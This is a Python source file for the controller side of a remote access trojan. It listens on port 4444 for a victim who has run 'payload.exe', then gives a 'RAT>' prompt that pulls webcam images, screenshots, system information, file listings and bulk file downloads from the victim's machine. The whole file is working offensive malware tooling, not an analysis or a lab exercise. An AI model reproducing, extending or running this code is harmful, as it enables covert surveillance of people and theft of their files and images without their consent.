import socket
import json
import base64
import os
from datetime import datetime

def save_file(content, filename):
    with open(filename, "wb") as f:
        f.write(base64.b64decode(content))

def start_listener():
    s = socket.socket()
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    print("[*] Waiting for victim... (Run payload.exe on target)")
    conn, addr = s.accept()
    print(f"[+] Connected to {addr[0]}")
    
    # Show initial system info
    sysinfo = json.loads(conn.recv(999999).decode())
    print("\n=== SYSTEM INFO ===")
    print(json.dumps(sysinfo, indent=4))
    
    while True:
        cmd = input("\nRAT> ")
        if not cmd:
            continue
            
        conn.send(cmd.encode())
        
        if cmd.lower() == "exit":
            break
            
        data = conn.recv(9999999).decode()
        
        if cmd == "webcam":
            save_file(data, f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
            print("[+] Webcam saved")
        elif cmd == "screenshot":
            save_file(data, f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            print("[+] Screenshot saved")
        elif cmd == "sysinfo":
            print(json.dumps(json.loads(data), indent=4))
        elif cmd == "autodownload":
            files = json.loads(data)
            print(f"[+] Downloaded {len(files)} files:")
            for file in files:
                save_file(file["content"], file["name"])
                print(f" - {file['name']} ({file['size']} bytes)")
        elif cmd.startswith("file_list"):
            print("Files:", ", ".join(json.loads(data)))
        elif cmd.startswith("file_read"):
            filename = input("Save as: ") or "downloaded_file"
            save_file(data, filename)
            print(f"[+] Saved as {filename}")
        else:
            print(data)

if __name__ == "__main__":
    start_listener()
